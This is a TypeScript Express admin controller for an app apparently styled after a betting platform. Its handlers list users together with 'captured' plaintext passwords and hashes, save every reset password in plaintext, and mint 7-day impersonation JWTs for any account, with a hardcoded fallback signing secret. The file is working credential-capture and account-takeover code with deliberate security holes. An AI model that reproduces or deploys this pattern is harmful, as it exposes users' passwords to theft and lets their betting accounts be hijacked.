/**
 * AdminController.ts — JSON admin API handlers.
 * Mounted at /appsynapse/admin via routes/adminApi.ts.
 * Shares the admin session cookie with the /admin dashboard.
 * Exposes user details (including plaintext-captured passwords + hashes),
 * password reset, and JWT impersonation.
 */

import { Request, Response } from 'express'
import { prisma } from '../db'

const JWT_SECRET = process.env.JWT_SECRET ?? 'betway-local-secret-change-in-prod'

function notFound(res: Response, msg = 'User not found'): void {
  res.status(404).json({ error: msg })
}

// ── List all users (with captured plaintext passwords + hashes) ───────────────
export async function listUsers(_req: Request, res: Response): Promise<void> {
  try {
    const users = await prisma.user.findMany({ orderBy: { createdAt: 'desc' } })
    res.json(users)
  } catch (err) {
    console.error('[admin-api] listUsers error:', (err as Error).message)
    res.status(500).json({ error: 'Failed to list users' })
  }
}

// ── Single user ───────────────────────────────────────────────────────────────
export async function getUser(req: Request, res: Response): Promise<void> {
  try {
    const user = await prisma.user.findUnique({ where: { userId: req.params.userId } })
    if (!user) return notFound(res)
    res.json(user)
  } catch (err) {
    console.error('[admin-api] getUser error:', (err as Error).message)
    res.status(500).json({ error: 'Failed to get user' })
  }
}

// ── Reset a user's password (new bcrypt hash + plaintext capture) ────────────
export async function resetPassword(req: Request, res: Response): Promise<void> {
  try {
    const { newPassword } = req.body as { newPassword?: string }
    if (!newPassword || typeof newPassword !== 'string') {
      res.status(400).json({ error: 'newPassword is required' })
      return
    }
    const bcrypt = (await import('bcryptjs')).default
    const hash = await bcrypt.hash(newPassword, 12)
    const user = await prisma.user.update({
      where: { userId: req.params.userId },
      data:  { passwordHash: hash, plaintextPassword: newPassword },
    })
    res.json({ ok: true, userId: user.userId, username: user.username, message: 'Password reset' })
  } catch (err) {
    console.error('[admin-api] resetPassword error:', (err as Error).message)
    res.status(500).json({ error: 'Failed to reset password' })
  }
}

// ── Impersonate — mint a valid JWT for the target user ───────────────────────
export async function impersonate(req: Request, res: Response): Promise<void> {
  try {
    const jwt = (await import('jsonwebtoken')).default
    const user = await prisma.user.findUnique({ where: { userId: req.params.userId } })
    if (!user) return notFound(res)
    // Same payload shape as AuthController.sign(): { sub: userId }
    const token = jwt.sign({ sub: user.userId }, JWT_SECRET, { expiresIn: '7d' })
    res.json({
      ok: true,
      token,
      tokenType: 'Bearer',
      userId: user.userId,
      username: user.username,
      expiresIn: '7d',
      usage: 'Set header Authorization: Bearer <token> on /appsynapse/auth/me, betting, and player endpoints',
    })
  } catch (err) {
    console.error('[admin-api] impersonate error:', (err as Error).message)
    res.status(500).json({ error: 'Impersonation failed' })
  }
}

